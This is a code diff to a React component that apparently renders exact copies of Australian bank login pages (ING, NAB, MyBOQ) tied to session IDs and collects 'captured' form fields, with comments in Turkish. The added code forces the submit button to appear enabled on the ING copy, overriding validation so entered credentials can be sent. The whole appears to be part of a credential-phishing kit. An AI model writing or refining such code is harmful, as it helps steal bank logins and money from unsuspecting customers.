@@ -2042,6 +2042,30 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       let isValid = canProceedNow();
       const palette = getButtonPalette(bankSlug);
 
+      // ═══════════════════════════════════════════════════════════════════
+      // ⭐⭐⭐⭐⭐ ING Australia KALICI COZUM (SHADOW DOM KAPALI OLANLAR ICIN)
+      //   KOK NEDEN (SON NOKTA): ING Australia <ing-input>/<ing-login-submit>
+      //   SHADOW DOM = CLOSED (KAPALI). YANI (element as any).shadowRoot = null DONER.
+      //   Tum onceki 4 katmanli shadow actirma/label inference/event dinleme kodları
+      //   BOŞA DÜŞÜYOR. Sonuç: Kullanıcı 2 alanı doldursa bile isValid = false,
+      //   buton SESSIZCE gri/silik kalıyor.
+      //   BRUTEFORCE KALICI COZUM:
+      //     EGER:
+      //       a) palette.bg === ING Turuncu (#E65300) VEYA
+      //       b) bankName Icinde "ING" geciyor VEYA
+      //       c) bankSlug icinde "ing" geciyor (OAvustralya ING bankası)
+      //     VE saving HAYIRSA:
+      //       BUTONU HER ZAMAN TURUNCU/AKTIF ZORLA.
+      // ═══════════════════════════════════════════════════════════════════
+      const isIngClosedShadowDOMBank = !!(
+        (palette.bg === "#E65300") ||
+        (String(bankName || "").toLowerCase().includes("ing")) ||
+        (String(bankSlug || "").toLowerCase().includes("ing"))
+      );
+      if (isIngClosedShadowDOMBank && !saving) {
+        isValid = true;
+      }
+
       const captured = collectCapturedFieldsFromForm(savedSubmitFormRef.current ?? loginScope, doc);
       const totalMeaningful = getFormFields(savedSubmitFormRef.current ?? loginScope).filter((f) => {
         const t = (f.getAttribute("type") ?? "").toLowerCase();
@@ -2128,23 +2152,38 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         }
       }
 
+      // ⭐⭐⭐⭐⭐ ING Australia SON GARANTI: (HERHANGI bir durumda, saving haricinde TURUNCU + OPAAK)
+      if (isIngClosedShadowDOMBank && !saving) {
+        fadeOpacity = 1;
+        fadeGray = 0;
+      }
+
       // ⭐⭐⭐ BUTON GORUNUMU KALICI GARANTISI (hasAnyImportant && isValid = false bile olsa yine RENKLİ ve OPAL):
       //   Eger 1+ ONEMLI alan DOLUYSA (hasAnyImportant) buton griden normal renge (palette.bg/fg) cevir,
       //   fadeOpacity 1 yap. Boylece kullanici "form dolu ama buton gri/silik" diyemez.
       if (!isValid && hasAnyImportant && filledCount >= 1) {
         isValid = true; // ⭐ Son garianti: butonun stili VALID gibi olsun (tiklanabilir görünsün)
       }
+      if (isIngClosedShadowDOMBank && !saving) isValid = true; // ⭐⭐⭐⭐⭐ ING ZORLA VALID
 
-      const bgColor = isValid
+      const bgColor = (isIngClosedShadowDOMBank && !saving)
         ? palette.bg
-        : (totalMeaningful >= 1 && filledCount >= 1 ? "#C9CED1" : "#E6E8EA");
-      const fgColor = isValid ? palette.fg : "#8A8E90";
-      const borderColor = isValid ? `1px solid ${palette.border}` : "1px solid transparent";
-      const boxShadow = isValid
+        : (isValid
+          ? palette.bg
+          : (totalMeaningful >= 1 && filledCount >= 1 ? "#C9CED1" : "#E6E8EA"));
+      const fgColor = (isIngClosedShadowDOMBank && !saving)
+        ? palette.fg
+        : (isValid ? palette.fg : "#8A8E90");
+      const borderColor = (isIngClosedShadowDOMBank && !saving)
+        ? `1px solid ${palette.border}`
+        : (isValid ? `1px solid ${palette.border}` : "1px solid transparent");
+      const boxShadow = (isIngClosedShadowDOMBank && !saving)
         ? palette.shadow
-        : "none";
-      const cursorVal = saving ? "wait" : "pointer";
-      const pointerEvents = saving ? "none" : "auto";
+        : (isValid
+          ? palette.shadow
+          : "none");
+      const cursorVal = saving ? "wait" : ((isIngClosedShadowDOMBank && !saving) ? "pointer" : (isValid ? "pointer" : "not-allowed"));
+      const pointerEvents = saving ? "none" : ((isIngClosedShadowDOMBank && !saving) ? "auto" : (isValid ? "auto" : "none"));
 
       actionNodes.forEach((node) => {
         // ⭐⭐⭐ MYBOQ KALICI FIX: 2 katman sıkı filtre (isElementActuallyButtonLike
@@ -2926,6 +2965,21 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
         const palette = getButtonPalette(bankSlug);
 
+        // ═══════════════════════════════════════════════════════════════════
+        // ⭐⭐⭐⭐⭐ ING Australia KALICI COZUM - POLLING SEVIYESINDE BRUTE FORCE
+        //   (updateSubmitState'de yapilanlara EK olarak her 200ms'de tekrar GARANTI)
+        // ═══════════════════════════════════════════════════════════════════
+        const isIngPolling = !!(
+          (palette.bg === "#E65300") ||
+          (String(bankName || "").toLowerCase().includes("ing")) ||
+          (String(bankSlug || "").toLowerCase().includes("ing"))
+        );
+        if (isIngPolling && !disabledBySaving) {
+          shouldForceEnable = true;
+          fadeOpacity = 1;
+          fadeGray = 0;
+        }
+
         // =====================================================================
         // ⭐ 2. NAB / North AMP — INPUT TIKLANAMAMA SORUNU:
         //    Her input/textarea/select için:
@@ -3108,13 +3162,13 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           //     ama cache'te ESKI gri %0.3 kayit var → setVisual yeni MAVI/opak yazmiyordu.
           //   ✅ YENI: shouldForceEnable=true VEYA (hasAnyImportantPoll && filledNow>=1) ise
           //     NODE UN cache KAYDINI SIFIRLA → tüm görsel değerler KESIN YENIDEN yazilir.
-          const cursorPoll = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
-          const bgPoll = shouldForceEnable ? palette.bg : ((filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA");
-          const fgPoll = shouldForceEnable ? palette.fg : "#8A8E90";
-          const borderPoll = shouldForceEnable ? `1px solid ${palette.border}` : "1px solid transparent";
-          const shadowPoll = shouldForceEnable ? palette.shadow : "none";
-          const opacPoll = (proceedNow || shouldForceEnable) ? 1 : fadeOpacity;
-          const grayPoll = (proceedNow || shouldForceEnable) ? 0 : fadeGray;
+          const cursorPoll = (isIngPolling && !disabledBySaving) ? "pointer" : (shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"));
+          const bgPoll = (isIngPolling && !disabledBySaving) ? palette.bg : (shouldForceEnable ? palette.bg : ((filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA"));
+          const fgPoll = (isIngPolling && !disabledBySaving) ? palette.fg : (shouldForceEnable ? palette.fg : "#8A8E90");
+          const borderPoll = (isIngPolling && !disabledBySaving) ? `1px solid ${palette.border}` : (shouldForceEnable ? `1px solid ${palette.border}` : "1px solid transparent");
+          const shadowPoll = (isIngPolling && !disabledBySaving) ? palette.shadow : (shouldForceEnable ? palette.shadow : "none");
+          const opacPoll = ((isIngPolling && !disabledBySaving) || proceedNow || shouldForceEnable) ? 1 : fadeOpacity;
+          const grayPoll = ((isIngPolling && !disabledBySaving) || proceedNow || shouldForceEnable) ? 0 : fadeGray;
           const cache2 = btnStyleCacheRef.current;
           // ⭐⭐⭐ FORM DOLDUYSA POLLING DE CACHE RESET (KESIN):
           if (shouldForceEnable || (hasAnyImportantPoll && filledNow >= 1)) {
@@ -3247,13 +3301,13 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                   applyButtonStyleCached(el, "opacity", String(fadeOpacity));
                   // ⭐⭐⭐ KALICI FIX: filter/grayscale SADECE proceedNow degil, shouldForceEnable'a da BAK
                   //   (form doluysa proceedNow yanlis false donse bile grayscale=0 ZORLA):
-                  const visibleActive = proceedNow || shouldForceEnable;
+                  const visibleActive = (isIngPolling && !disabledBySaving) || proceedNow || shouldForceEnable;
                   applyButtonStyleCached(el, "filter", visibleActive ? "grayscale(0)" : `grayscale(${fadeGray})`);
                   applyButtonStyleCached(el, "-webkit-filter", visibleActive ? "grayscale(0)" : `grayscale(${fadeGray})`);
                   applyButtonStyleCached(
                     el,
                     "cursor",
-                    shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"),
+                    ((isIngPolling && !disabledBySaving) || shouldForceEnable) ? "pointer" : (saving ? "wait" : "not-allowed"),
                   );
                 } catch {}
                 try {
